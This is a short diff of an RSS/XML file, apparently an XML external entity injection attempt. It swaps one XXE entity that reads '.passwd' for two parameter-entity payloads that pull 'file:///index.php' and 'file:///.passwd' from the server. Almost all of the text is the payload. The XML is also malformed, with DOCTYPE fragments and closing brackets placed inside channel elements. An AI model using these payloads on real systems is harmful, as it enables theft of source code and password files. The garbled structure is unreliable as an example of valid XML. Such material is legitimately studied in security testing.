@@ -2,15 +2,18 @@
 <rss version="2.0">
 
 <channel>
-  <title>&xxe;</title>
-  <link>https://www.w3schools.com</link>
-  <description>Free web building tutorials</description>
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM ".passwd" >
+    <!ENTITY % local_dtd SYSTEM "file:///index.php">
+
+    %local_dtd;
 ]>
-<foo>&xxe;</foo>
+<root></root>
+</channel>
+  <channel>
+    <!ENTITY % local_dtd SYSTEM "file:///.passwd">
+
+    %local_dtd;
+]>
+<root></root>
 </channel>
 
 </rss>
